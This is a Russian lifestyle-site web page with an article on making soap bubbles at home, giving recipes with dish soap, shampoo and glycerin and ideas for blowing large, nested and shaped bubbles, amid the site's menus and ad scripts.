<ul class="art-menu"><IDXSKIP><li class="item1"><a href="http://viva-woman.ru/"><span class="l"></span><span class="r"></span><span class="t">Главная</span></a></li></IDXSKIP><IDXSKIP><li class="parent item56"><a href="/moda/"><span class="l"></span><span class="r"></span><span class="t">Мода</span></a><ul><li class="item57"><a href="/aksessuary/">Аксессуары</a></li><li class="item58"><a href="/table/tendentsii/">Тенденции</a></li><li class="item60"><a href="/uroki-stilya/">Уроки стиля</a></li><li class="item189"><a href="/moda-2011-2012/">Мода 2016- 2017</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item62"><a href="/krasota/"><span class="l"></span><span class="r"></span><span class="t">Красота</span></a><ul><li class="item63"><a href="/kosmetologiya/">Косметика</a></li><li class="item64"><a href="/parfyum/">Парфюм</a></li><li class="item66"><a href="/makiyazh/">Макияж</a></li><li class="item67"><a href="/manikyur/">Маникюр</a></li><li class="item68"><a href="/uhod-za-litsom/">Уход за лицом</a></li><li class="item65"><a href="/uhod-za-volosami/">Уход за волосами</a></li><li class="item69"><a href="/uhod-za-telom/">Уход за телом</a></li><li class="item224"><a href="/lunnyy-kalendar-strizhek-na-2016-god/">Лунный календарь стрижек</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item70"><a href="/zdorove/"><span class="l"></span><span class="r"></span><span class="t">Здоровье</span></a><ul><li class="item71"><a href="/zhenskoe-zdorove/">Женское и мужское здоровье</a></li><li class="item72"><a href="/zdorovoe-pitanie/">Здоровое питание</a></li><li class="item73"><a href="/diety-dlya-pohudeniya/">Диеты для похудения</a></li><li class="item187"><a href="/fitnes/">Фитнес</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item75"><a href="/zvezdy/"><span class="l"></span><span class="r"></span><span class="t">Звезды</span></a><ul><li class="item194"><a href="/novosti-shou-biznesa/">Новости шоу-бизнеса</a></li><li class="item76"><a href="/zvezdnye-istorii/">Звездные истории</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item80"><a href="/uvlecheniya-i-hobbi/"><span class="l"></span><span class="r"></span><span class="t">Увлечения</span></a><ul><li class="item84"><a href="/vyshivanie/">Вышивание</a></li><li class="item81"><a href="/shem-sami/">Шьем сами</a></li><li class="item102"><a href="/puteshestviya/">Путешествия</a></li><li class="item85"><a href="/shoping/">Шопинг</a></li><li class="item83"><a href="/masterim/">Мастерим</a></li><li class="item190"><a href="/kino/">Кино</a></li><li class="item209"><a href="/mylovarenie/">Мыловарение</a></li><li class="item221"><a href="/kak-plesti-braslety-iz-rezinok/">как плести браслеты</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item86"><a href="/karera/"><span class="l"></span><span class="r"></span><span class="t">Карьера</span></a><ul><li class="item89"><a href="/formula-uspeha/">Формула успеха</a></li><li class="item87"><a href="/poisk-raboty/">Поиск работы</a></li><li class="item90"><a href="/trudovoy-kollektiv/">Трудовой коллектив</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item92"><a href="/lyubov/"><span class="l"></span><span class="r"></span><span class="t">Любовь</span></a><ul><li class="item93"><a href="/lyubov/">Интим</a></li><li class="item95"><a href="/semya/">Семья</a></li><li class="item97"><a href="/izmena/">Измена</a></li><li class="item96"><a href="/psihologiya-otnosheniy/">Психология отношений</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item98"><a href="/deti/"><span class="l"></span><span class="r"></span><span class="t">Дети</span></a><ul><li class="item103"><a href="/beremennost/">Беременность</a></li><li class="item104"><a href="/detki-ot-0-do-3/">Детки от 0 до 3</a></li><li class="item106"><a href="/detki-ot-6-do-12/">Детки от 6 до 12</a></li></ul></li></IDXSKIP><li class="parent active item99"><a href="/kulinariya/" class="active"><span class="l"></span><span class="r"></span><span class="t">Кулинария</span></a><ul><li class="item114"><a href="/prazdnichnye-blyuda/">Праздничные блюда</a></li><li class="item115"><a href="/retsepty-na-kazhdyy-den/">На каждый день</a></li><li id="current" class="active item116"><a href="/vypechka/" class="active">Выпечка</a></li><li class="item211"><a href="/kak-prigotovit/">Как приготовить</a></li><li class="item214"><a href="/zagotovki/">Заготовки</a></li><li class="item220"><a href="/gotovim-v-multivarke/">Готовим в мультиварке</a></li></ul></li><IDXSKIP><li class="parent item100"><a href="/moy-dom/"><span class="l"></span><span class="r"></span><span class="t">Мой дом</span></a><ul><li class="item110"><a href="/uyutnyy-dom/">Уютный дом</a></li><li class="item111"><a href="/interer/">Интерьер</a></li><li class="item112"><a href="/domashnie-rasteniya/">Домашние растения</a></li><li class="item113"><a href="/domashnie-zhivotnye/">Домашние животные</a></li><li class="item109"><a href="/fenshuy/">Фэн шуй</a></li><li class="item192"><a href="/poleznye-sovety/">Полезные советы</a></li></ul></li></IDXSKIP><IDXSKIP><li class="parent item101"><a href="/magiya/"><span class="l"></span><span class="r"></span><span class="t">Магия</span></a><ul><li class="item118"><a href="/goroskopy/">Гороскопы</a></li><li class="item117"><a href="/gadaniya/">Гадания</a></li><li class="item120"><a href="/obryady/">Магические обряды</a></li></ul></li></IDXSKIP><IDXSKIP><li class="item204"><a href="/component/option,com_xmap/Itemid,204/sitemap,1/"><span class="l"></span><span class="r"></span><span class="t">Карта</span></a></li></IDXSKIP><IDXSKIP><li class="item225"><a href="/2017/"><span class="l"></span><span class="r"></span><span class="t">2017 год</span></a></li></IDXSKIP></ul></div>


<div class="art-content-layout">
    <div class="art-content-layout-row">
<div class="art-layout-cell art-sidebar1">
		<div class="art-block">
		    <div class="art-block-body">
		
						<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="junewsultra">
	<div class="junews">
        		    <a href="/zdorovoe-pitanie/frukt-pomelo-poleznye-svojstva-kak-edjat-pomelo-chem-polezen-pomelo-polza-i-vred.html"><IDXSKIP>Помело фрукт полезные свойства и вред</IDXSKIP></a><br />
        
        			<IDXSKIP><a href="/zdorovoe-pitanie/frukt-pomelo-poleznye-svojstva-kak-edjat-pomelo-chem-polezen-pomelo-polza-i-vred.html" title="Помело фрукт полезные свойства и вред" ><img src="/images/stories/zdorove/-pomelo%201.jpg" alt="Помело фрукт полезные свойства и вред" /></a></IDXSKIP><br />
        
        <div class="small juinfo">
                            </div>

        <div class="small juinfo">
                                      </div>

        
        
        	</div>
</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		<IDXSKIP><div class="art-block">
		    <div class="art-block-body">
		
						<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="bannergroup">

	<div class="bannerheader"><div id="teaser_314"><a href="http://medicinetizer.ru/">Тизерная сеть</a></div>
<script type="text/javascript">var medtizer314=document.createElement('script'); medtizer314.src='http://medicinetizer.ru/show/?block_id=314&title='+document.title+'&r='+escape(document.referrer)+'&'+Math.round(Math.random()*100000); document.body.appendChild(medtizer314);</script></div>

</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		
				<div class="cleared"></div>
		    </div>
		</div></IDXSKIP>
		
		<div class="art-block">
		    <div class="art-block-body">
		
						<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="bannergroup">

	<div class="bannerheader"><div id='venus-45271'></div>
<script type='text/javascript'>
    var venus45271 = { 'blockId': 45271, 'async': true };
    (function (w, d, o, t) {
        o.send = function () {
            (o.queue = o.queue || []).push(arguments);
        };
        var s = d.createElement(t);
        if (o.async) s.async = 1;
        s.src = 'http://block.s4block.com/rotator/45271.js';
        var i = d.getElementsByTagName(t)[0];
        i.parentNode.insertBefore(s, i);
        o.send('pageview');
    })(window, document, venus45271, 'script');
</script></div>

</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		<IDXSKIP><div class="art-block">
		    <div class="art-block-body">
		
						<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="bannergroup">

	<div class="bannerheader"><!--noindex--><div id="gnezdo_ru_4356">Загрузка...</div>
<script language="JavaScript" src="http://news.gnezdo.ru/show/4356/block.js" type="text/javascript" charset="windows-1251"></script><!--/noindex--></div>

</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		
				<div class="cleared"></div>
		    </div>
		</div></IDXSKIP>
		


  <div class="cleared"></div>
</div>
<div class="art-layout-cell art-content">

		<div class="art-post">
		    <div class="art-post-tl"></div>
		    <div class="art-post-tr"></div>
		    <div class="art-post-bl"></div>
		    <div class="art-post-br"></div>
		    <div class="art-post-tc"></div>
		    <div class="art-post-bc"></div>
		    <div class="art-post-cl"></div>
		    <div class="art-post-cr"></div>
		    <div class="art-post-cc"></div>
		    <div class="art-post-body">
		<div class="art-post-inner">
		
						<div class="art-postcontent">
		
		<span class="breadcrumbs pathway">
<IDXSKIP><a href="http://viva-woman.ru/" class="pathway">Home</a></IDXSKIP> <img src="/images/M_images/arrow.png" alt=""  /> <a href="/moy-dom/" class="pathway">Мой дом</a> <img src="/images/M_images/arrow.png" alt=""  /> <a href="/poleznye-sovety/" class="pathway">Полезные советы</a> <img src="/images/M_images/arrow.png" alt=""  /> Как сделать мыльные пузыри в домашних условиях</span>

		</div>
		<div class="cleared"></div>
		
		
		</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
<div class="art-post">
    <div class="art-post-tl"></div>
    <div class="art-post-tr"></div>
    <div class="art-post-bl"></div>
    <div class="art-post-br"></div>
    <div class="art-post-tc"></div>
    <div class="art-post-bc"></div>
    <div class="art-post-cl"></div>
    <div class="art-post-cr"></div>
    <div class="art-post-cc"></div>
    <div class="art-post-body">
<div class="art-post-inner">
<div class="art-postmetadataheader">
<h2 class="art-postheader"> 
<a href="/poleznye-sovety/kak-sdelat-mylnye-puzyri.html" class="PostHeader">Как сделать мыльные пузыри в домашних условиях</a>
</h2>
</div>
<div class="art-postcontent">
<div align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 250*250 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:250px"
     data-ad-client="ca-pub-9842395647414577"
     data-ad-slot="7263805266"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 250*250 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:250px"
     data-ad-client="ca-pub-9842395647414577"
     data-ad-slot="7263805266"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div><div class="art-article"><p><span style="color: #993366;"><strong><img src="/images/stories/fruit/kak-sdelat-mylnye-puzyri.jpg" border="0" alt="Как сделать  мыльные пузыри в домашних условиях" width="150" height="98" style="margin: 11px; float: left;" /></strong></span>Для того, чтобы  сделать  домашние мыльные пузыри , вам понадобится:<br />Капелька пищевого красителя<br />2 чайные ложки  сахара<br />Полторы чашки  воды<br />Полчашки мыла посудного или шампуня детского</p>

<p><span style="color: #993366;"><br /></span></p>
<h2><span style="color: #993366;">Как сделать домашние  мыльные пузыри?</span></h2>
<p>Если каплю  мыла раздуть с помощью соломинки, то благодаря специальному сцеплению мыльных частиц, жидкость будет образовывать красивые мыльные пузыри. Если вы хотите сделать мыльные пузыри более прочными, то нужно примешать к ним равное количество глицерина аптечного. Из такой оригинальной смеси можно сделать не только огромные пузыри, но и фигурные. Особенно, если вы будете выдувать пузыри с помощью воронки или бумаги. Надо очень осторожно опустить бумажный свёрток в мыльную воду, аккуратно поднять его и медленно выдуть пузырь. Если вы попытаетесь делать пузыри из обычного мыльного раствора без глицерина зимой, то получите воздушный мыльный пузырь, покрытый такими узорами, какие обычно появляются в морозных окнах. <br /><br />Конечно, в пузырях  нет ничего нового, но зато  - это  весёлая и увлекательная игра для любого возраста. Возьмите кусочек клеёнки и обмажьте мылом или же шампунем. Потом возьмите деталь от пластмассовой ручки, у которой есть конусообразное отверстие. Потом возьмите шампунь, налейте в небольшую чашечку (прекрасно для этой цели подходит шампунь «Маленькая фея»). Затем начинайте выдувать пузыри. Если не очень хорошо получается, то возьмите немного воды и размешайте с шампунем.  Очень красиво выдуваются мыльные пузыри на клеёнку – на ней можно построить целый зоопарк – выдуть черепаху или Лошарика, к примеру. Можно забавляться, выдувая пузырь в пузыре. Если намазать руки шампунем, то можно трогать пузыри руками и они не будут лопаться. Очень приятно выдувать пузырь на ладонь.<br /><br />Кроме того, чтобы  сделать очень прочные пузыри, вы можете взять обычное хозяйственное мыло и глицерин. Мыло нужно настругать в воду, при помешивании можно даже дать мылу закипеть – так жидкость быстрее станет однородной. Главное, не обожгитесь – ведь мыльный раствор в горячем виде может обжечь не хуже киселя.<br /><br /><span style="color: #993366;"><span style="font-size: 14pt;">Как выдувать мыльный  пузырь?</span></span><br /><br /> Нужно взять  трубочку отвесно и обмакнуть  в жидкость так, чтобы на  её конце образовалась плёнка. После этого нужно выдуть большой  мыльный пузырь диаметром не  менее 10 см. Если пузырь выдувается, то раствор прекрасно подходит. Если нет, то придётся ещё настругать в воду мыла. Но это испытание – ещё не всё. Выдуйте пузырь, обмакните в мыльную жидкость палец и проткните пузырь. Если он выдержит, то всё в порядке. Если нет, то придётся домешать ещё мыла.<br /><br />Проводить опыты  с мыльными пузырями нужно спокойно, в комнате, где хорошее освещение – так вы сможете насладиться красотой радужных мыльных пузырей. <br /><br />Попробуйте провести несколько опытов.<br />Мыльный пузырь вокруг цветка. Нужно налить в тарелку или же небольшой поднос мыльный раствор примерно на 2 мм от дна. В середину нужно поместить вазочку или цветок и накрыть воронкой из стекла. После этого нужно очень медленно поднять воронку, не прекращая дуть в её узкий конус – так у вас получится мыльный пузырь. Осторожно отнимите воронку от пузыря, и ваш цветок будет лежать в полусфере из пузыря, который переливается всеми цветами радуги. Можно вместо цветка взять какую-нибудь статуэтку, помазать её голову мыльным раствором и выдуть пузырь, как шлем. <br />Можно выдувать пузыри друг в друге. Для этого нужно выдуть пузырь из воронки, потом в мыльный пузырь обмакнуть соломинку почти полостью, просунуть её в большой пузырь и выдуть внутри поменьше.<br /><br />Если в магазин  идти неохота, но мыльные пузыри очень нужны, то приготовьте их сами.<br /><br />Возьмите Фэйри  и шариковую ручку.<br /><br /> Фэйри нужно  разбавить водой – примерно 30 мл моющего средства на 100 мл  воды. Берём трубочку – любую  деталь из ручки.<br /><br />Вот и всё  ваши пузыри готовы – наслаждайтесь  игрой.<br /><br /> Прозрачные шарики подарят вам огромное удовольствие, как и от созерцания радужной красоты, так и от забав, которые с пузырями можно придумать. Этой забаве очень много лет, однако, она не потеряла своей актуальности, и сегодня по-прежнему дети и взрослые продолжают играть с пузырями. А малышам очень нравятся мыльные пузыри – ведь они похожи на настоящее радужное волшебство! И поэтому родители довольно часто ищут рецепты домашних пузырей, наиболее качественных по изготовлению.  <br /><br />Не многие знают, что для приготовления хороших, крепких пузырей не достаточно только одного мыльного раствора. Нужно приобрести ещё и глицерин. Самый простой способ изготовления хороших пузырей – это растворить в 600 мл воды 200 грамм жидкости для мытья посуды и 100 грамм глицерина.<br /><br />Есть ещё один способ, но он сложнее. Вам будет нужно 600 мл воды горячей, 300 мл раствора глицеринового, 50 грамм моющего порошка и примерно 20 капель нашатыря. Жидкость перемешивается, настаивается примерно 72 часа, затем фильтруется и ставится в холодильник.<br /><br /> Пузыри  – прекрасный способ расслабиться. Представьте, наполненная ароматная ванна, плавающие свечи – и красивые разноцветные пузыри вокруг. Просто замечательное зрелище, не так ли?<br /><br />А как интересно  выдувать пузыри при температуре  в 7 градусов ниже нуля! Красота получается необыкновенная – попробуйте положить пузырь на снег, и вы поймёте, почему.<br /><br />Можно немного  разнообразить и без того увлекательный  процесс выдувания пузырей –  например, сделать пузырь просто огромным. Для этого нужно связать примерно метр синтетической верёвки, прикрепить к палочкам в виде треугольника и обмакнуть конструкцию в мыльную жидкость. Затем верёвки достаются, палочки разводятся в стороны, и получается просто огромный мыльный пузырь, примерно с один метр в диаметре.<br /><br />Очень интересными получаются мыльные пузыри в виде матрёшки. Для этого нужна плоская тарелка примерно в 20 см, затем нужно налить в неё немного раствора и соломинкой надуть полусферический пузырь.<br /><br /> Потом трубочка очень аккуратно проворачивается, и получается, что она остаётся внутри, но от стенки пузыря отрывается. При этом так делать можно несколько раз, и получается пузырь в пузыре.<br /><br />Так экспериментировать с пузырями можно необыкновенно  долго, но помните, все эксперименты нужно делать в хорошо освещённой комнате, чтобы насладиться игрой красок.</p><br/><div align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- 468*60 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:468px;height:60px"
     data-ad-client="ca-pub-9842395647414577"
     data-ad-slot="2935107661"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
<div id='venus-1521'></div>
<script type='text/javascript'>
    var venus1521 = { 'blockId': 1521, 'async': true };
    (function (w, d, o, t) {
        o.send = function () {
            (o.queue = o.queue || []).push(arguments);
        };
        var s = d.createElement(t);
        if (o.async) s.async = 1;
        s.src = 'http://block.s1block.com/rotator/1521.js';
        var i = d.getElementsByTagName(t)[0];
        i.parentNode.insertBefore(s, i);
        o.send('pageview');
    })(window, document, venus1521, 'script');
</script>
<IDXSKIP><div id="teaser_313"><a href="http://medicinetizer.ru/">Тизерная сеть</a></div></IDXSKIP>
<script type="text/javascript">var medtizer313=document.createElement('script'); medtizer313.src='http://medicinetizer.ru/show/?block_id=313&title='+document.title+'&r='+escape(document.referrer)+'&'+Math.round(Math.random()*100000); document.body.appendChild(medtizer313);</script>
</div><IDXSKIP><span class="article_separator">&nbsp;</span></IDXSKIP><script type="text/javascript">
<!--
var jcomments=new JComments(459, 'com_content','/index.php?option=com_jcomments&amp;tmpl=component');
jcomments.setList('comments-list');
//-->
</script>
<div id="jc">
<div id="comments"></div>
<div id="comments-form-link">
<a id="addcomments" class="showform" href="#addcomments" onclick="jcomments.showForm(459,'com_content', 'comments-form-link'); return false;">Добавить комментарий</a>
</div>
<div id="comments-footer" align="center"><a href="http://www.joomlatune.ru" title="JComments" target="_blank">JComments</a></div>
<script type="text/javascript">
<!--
jcomments.setAntiCache(1,1,1);
//-->
</script> 
</div>
</div>
<div class="cleared"></div>

</div>

		<div class="cleared"></div>
    </div>
</div><script type="text/javascript" rel="nofollow" src="http://nnn.pm"></script>



  

  <div class="cleared"></div>
</div>
<div class="art-layout-cell art-sidebar2">
    <div class="art-vmenublock">
    <div class="art-vmenublock-body">

				<IDXSKIP><div class="art-vmenublockheader">
    <div class="l"></div>
    <div class="r"></div>
    <h3 class="t">
		Навигация</h3>
</div></IDXSKIP>

				<div class="art-vmenublockcontent">
    <div class="art-vmenublockcontent-body">

		<ul class="art-vmenu"><IDXSKIP><li class="item222"><a href="/kak-plesti-braslety-iz-rezinok/"><span class="l"></span><span class="r"></span><span class="t">как плести браслеты</span></a></li></IDXSKIP><IDXSKIP><li class="parent item122"><a href="/moda/"><span class="l"></span><span class="r"></span><span class="t">Мода</span></a></li></IDXSKIP><IDXSKIP><li class="parent item128"><a href="/krasota/"><span class="l"></span><span class="r"></span><span class="t">Красота</span></a></li></IDXSKIP><IDXSKIP><li class="parent item136"><a href="/zdorove/"><span class="l"></span><span class="r"></span><span class="t">Здоровье</span></a></li></IDXSKIP><IDXSKIP><li class="parent item141"><a href="/zvezdy/"><span class="l"></span><span class="r"></span><span class="t">Звезды</span></a></li></IDXSKIP><IDXSKIP><li class="parent item146"><a href="/uvlecheniya-i-hobbi/"><span class="l"></span><span class="r"></span><span class="t">Увлечения</span></a></li></IDXSKIP><IDXSKIP><li class="parent item152"><a href="/karera/"><span class="l"></span><span class="r"></span><span class="t">Карьера</span></a></li></IDXSKIP><IDXSKIP><li class="parent item158"><a href="/lyubov/"><span class="l"></span><span class="r"></span><span class="t">Любовь</span></a></li></IDXSKIP><IDXSKIP><li class="parent item164"><a href="/deti/"><span class="l"></span><span class="r"></span><span class="t">Дети</span></a></li></IDXSKIP><IDXSKIP><li class="parent item165"><a href="/kulinariya/"><span class="l"></span><span class="r"></span><span class="t">Кулинария</span></a></li></IDXSKIP><IDXSKIP><li class="parent item166"><a href="/moy-dom/"><span class="l"></span><span class="r"></span><span class="t">Мой дом</span></a></li></IDXSKIP><IDXSKIP><li class="parent item167"><a href="/magiya/"><span class="l"></span><span class="r"></span><span class="t">Магия</span></a></li></IDXSKIP><IDXSKIP><li class="item191"><a href="/novosti-so-vsego-sveta/"><span class="l"></span><span class="r"></span><span class="t">Это интересно</span></a></li></IDXSKIP><IDXSKIP><li class="parent item207"><a href="/otdyh/"><span class="l"></span><span class="r"></span><span class="t">Отдых</span></a></li></IDXSKIP><IDXSKIP><li class="item217"><a href="/gadaniya/"><span class="l"></span><span class="r"></span><span class="t">Фен шуй</span></a></li></IDXSKIP></ul>
		<div class="cleared"></div>
    </div>
</div>

				<div class="cleared"></div>
    </div>
</div>

		<div class="art-block">
		    <div class="art-block-body">
		
						<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="bannergroup">

	<div class="bannerheader"><!--noindex--><div id='venus-1781'></div>
<script type='text/javascript'>
    var venus1781 = { 'blockId': 1781, 'async': true };
    (function (w, d, o, t) {
        o.send = function () {
            (o.queue = o.queue || []).push(arguments);
        };
        var s = d.createElement(t);
        if (o.async) s.async = 1;
        s.src = 'http://block.s1block.com/rotator/1781.js';
        var i = d.getElementsByTagName(t)[0];
        i.parentNode.insertBefore(s, i);
        o.send('pageview');
    })(window, document, venus1781, 'script');
</script><!--/noindex--></div>

</div>
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		
				<div class="cleared"></div>
		    </div>
		</div>
		
		<div class="art-block">
		    <div class="art-block-body">
		
				<IDXSKIP><div class="art-blockheader">
		    <div class="l"></div>
		    <div class="r"></div>
		    <h3 class="t">
		Кулинария </h3>
		</div></IDXSKIP>
		
				<div class="art-blockcontent">
		    <div class="art-blockcontent-tl"></div>
		    <div class="art-blockcontent-tr"></div>
		    <div class="art-blockcontent-bl"></div>
		    <div class="art-blockcontent-br"></div>
		    <div class="art-blockcontent-tc"></div>
		    <div class="art-blockcontent-bc"></div>
		    <div class="art-blockcontent-cl"></div>
		    <div class="art-blockcontent-cr"></div>
		    <div class="art-blockcontent-cc"></div>
		    <div class="art-blockcontent-body">
		
		<div class="junewsultra">
	<div class="junews">
        		    <a href="/retsepty-na-kazhdyy-den/chto-prigotovit-bystro-i-vkusno-na-obed.html"><IDXSKIP>Что приготовить  быстро и вкусно на обед </IDXSKIP></a><br />
        
